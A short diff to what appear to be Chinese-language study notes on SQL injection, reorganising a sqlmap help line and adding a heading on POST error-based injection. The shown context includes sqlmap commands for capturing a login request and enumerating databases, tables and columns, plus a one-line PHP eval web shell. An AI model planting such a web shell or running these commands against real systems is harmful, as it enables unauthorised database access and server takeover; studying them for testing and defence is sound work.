@@ -158,6 +158,7 @@ print(result['country_name'])
 - 登录注入需要抓取提交的数据包，可以借用burpsuite抓取后复制保存至本地文件test.txt
 - sqlmap -r test.txt -p username --dbs
 - sqlmap -u "http://..." --dbs / -D 指定数据库 -T 指定表 -C 输出所有字段
+- sqlmap -hh查看详细的帮助信息
 
 ### 分类
 - 数字型：select * from table_name where id = 1;
@@ -197,5 +198,5 @@ print(result['country_name'])
 ```PHP
 <?php @eval($_POST['x']);?>
 ```
-#### sqlmap使用
-- sqlmap -hh查看详细的帮助信息
+### POST错误注入
+
